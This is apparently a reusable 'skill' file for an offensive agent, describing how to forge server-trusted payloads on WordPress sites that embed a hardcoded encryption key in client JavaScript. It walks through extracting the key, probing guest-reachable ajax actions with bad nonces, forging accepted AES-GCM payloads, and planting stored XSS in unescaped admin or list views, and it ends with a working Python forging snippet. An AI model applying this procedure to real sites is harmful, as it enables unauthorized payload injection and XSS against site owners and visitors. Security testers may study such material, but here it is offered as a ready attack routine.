# Skill: Hardcoded client-side "encryption" → server-trusted payload forgery

Trigger: WordPress/site ships a JS "encryption key"/shared secret that
"must match server-side"; or an endpoint accepting an `encrypted_payload`.

Procedure:
1. Find the key + scheme in theme/plugin JS (AES-GCM with SHA256(key) is common;
   payload often base64(IV‖ct‖tag)). Never trust client-side crypto notes.
2. Reproduce the primitive locally (Python `cryptography` AESGCM works).
3. Enumerate guest-reachable ajax actions: send `action=<name>&nonce=bad` —
   `-1` = registered, `0` = not. Fetch a real guest nonce from the page
   (`webagency_ajax.nonce` style inline object).
4. Forge the payload chain the legit client uses and confirm acceptance
   (200/success=true). If the save only writes once per id, use a NEW post/resource.
5. Look for an unescaped render of the decrypted field (list views, admin pages).
   Plant XSS there.

Reusable snippet (forge + submit):
```python
import json, hashlib, os, base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
key = hashlib.sha256(b'<KEY_FROM_JS>').digest()
aesgcm = AESGCM(key); iv = os.urandom(12)
payload = json.dumps({'field': '<controlled>', ...}).encode()
blob = base64.b64encode(iv + aesgcm.encrypt(iv, payload, None)).decode()
```
